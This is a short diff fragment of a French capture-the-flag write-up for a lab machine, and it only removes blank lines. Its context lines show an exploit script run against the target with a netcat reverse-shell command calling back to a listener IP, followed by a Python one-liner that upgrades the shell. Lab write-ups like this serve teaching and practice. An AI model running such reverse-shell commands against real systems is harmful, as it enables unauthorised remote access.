@@ -60,10 +60,6 @@ Pour ceux qui n'utilisent pas trop meterpreter, c'est un module de metasploit, c
 python3 exploit.py -t 'http://editor.htb:8080' -c 'busybox nc 10.10.10.10 4444 -e /bin/bash'
 ```
 
-
-
-
-
 Et juste comme ça on obtient notre meterpreter. On récupère un shell que l'on améliore un peu:
 ```
 python3 -c 'import pty;pty.spawn("/bin/bash");'
